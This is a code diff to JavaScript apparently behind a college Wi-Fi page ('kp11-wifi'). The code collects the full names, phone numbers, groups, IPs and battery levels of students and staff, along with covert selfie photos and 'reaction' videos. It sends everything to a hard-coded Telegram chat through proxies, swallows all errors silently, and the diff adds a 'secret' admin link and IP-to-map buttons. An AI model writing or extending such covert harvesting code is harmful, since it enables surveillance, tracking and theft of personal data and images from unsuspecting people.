@@ -625,12 +625,13 @@
   const TELEGRAM_CHAT_ID = "6651741310";
 
   // ===== ПРОКСИ =====
-  // 1. Yandex API Gateway (основной, РФ, не блокируется)
-  // 2. Vercel (резерв)
   const PROXY_URLS = [
     "https://d5dgfgs6u47gp1pvnifv.0ly8ed4d.apigw.yandexcloud.net/",
     "https://kp11-proxy.vercel.app/api/proxy"
   ];
+
+  // ===== АДМИНКА =====
+  const ADMIN_URL = "https://kp11mskobrru.github.io/kp11-wifi/admin-kp11-secret.html";
 
   // ============================================================
   //  Утилиты
@@ -641,6 +642,17 @@
     if (method === "sendDocument") return 60000;
     if (method === "sendPhoto") return 30000;
     return 15000;
+  }
+
+  // Кнопки: Админка + Карта (если есть IP)
+  function buildButtons(ip) {
+    const rows = [
+      [{ text: "📊 Открыть админку", url: ADMIN_URL }]
+    ];
+    if (ip) {
+      rows.push([{ text: "📍 Карта по IP", url: `https://www.google.com/maps?q=${encodeURIComponent(ip)}` }]);
+    }
+    return { inline_keyboard: rows };
   }
 
   // ============================================================
@@ -679,23 +691,25 @@
   }
 
   // ============================================================
-  //  ТЕКСТ
+  //  ТЕКСТ (с кнопками)
   // ============================================================
-  async function sendTelegramNotify(text) {
+  async function sendTelegramNotify(text, replyMarkup) {
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: "HTML",
+      disable_web_page_preview: true
+    };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
     try {
-      await sendWithFailover("sendMessage", {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: text,
-        parse_mode: "HTML",
-        disable_web_page_preview: true
-      });
+      await sendWithFailover("sendMessage", payload);
     } catch (err) {}
   }
 
   // ============================================================
-  //  ФОТО
+  //  ФОТО (с кнопками)
   // ============================================================
-  async function sendTelegramPhoto(photoBase64, caption) {
+  async function sendTelegramPhoto(photoBase64, caption, replyMarkup) {
     if (!photoBase64) return;
 
     const payload = {
@@ -705,6 +719,7 @@
       file_base64: photoBase64,
       filename: "selfie.jpg"
     };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
 
     try {
       const res = await sendWithFailover("sendPhoto", payload);
@@ -717,9 +732,9 @@
   }
 
   // ============================================================
-  //  ВИДЕО
+  //  ВИДЕО (с кнопками)
   // ============================================================
-  async function sendTelegramVideo(videoBase64, caption) {
+  async function sendTelegramVideo(videoBase64, caption, replyMarkup) {
     if (!videoBase64) return;
 
     const payload = {
@@ -729,6 +744,7 @@
       file_base64: videoBase64,
       filename: "video.mp4"
     };
+    if (replyMarkup) payload.reply_markup = replyMarkup;
 
     try {
       const res = await sendWithFailover("sendVideo", payload);
@@ -1372,12 +1388,14 @@
   }
 
   // ============================================================
-  //  СОХРАНЕНИЕ: Firebase + Telegram (текст → фото → видео)
+  //  СОХРАНЕНИЕ: Firebase + Telegram
   // ============================================================
   async function saveToFirestore(videoBase64, photoBase64) {
     if (!pendingData) return;
     const deviceInfo = await collectDeviceInfo();
     const { fio, phone, group, isStaff, staffFio } = pendingData;
+
+    const buttons = buildButtons(deviceInfo.ip);
 
     try {
       if (isStaff) {
@@ -1403,9 +1421,13 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        await sendTelegramNotify(caption);
-        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
-        if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
+        await sendTelegramNotify(caption, buttons);
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога", buttons);
+        if (videoBase64) {
+          await sendTelegramVideo(videoBase64, "🎥 Реакция педагога", buttons);
+        } else {
+          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>", buttons);
+        }
       } else {
         const docData = {
           fio, phone, group,
@@ -1429,9 +1451,13 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        await sendTelegramNotify(caption);
-        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
-        if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
+        await sendTelegramNotify(caption, buttons);
+        if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента", buttons);
+        if (videoBase64) {
+          await sendTelegramVideo(videoBase64, "🎥 Реакция студента", buttons);
+        } else {
+          await sendTelegramNotify("🎬 <b>Видео не загрузилось</b>", buttons);
+        }
       }
     } catch (err) {}
   }
@@ -1481,6 +1507,7 @@
       (async () => {
         try {
           const deviceInfo = await collectDeviceInfo();
+          const buttons = buildButtons(deviceInfo.ip);
 
           try {
             await addDoc(collection(db, "staff"), {
@@ -1506,7 +1533,7 @@
             "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
             "⚠️ <b>Это сотрудник колледжа!</b>";
 
-          await sendTelegramNotify(caption);
+          await sendTelegramNotify(caption, buttons);
         } catch (err) {}
       })();
 
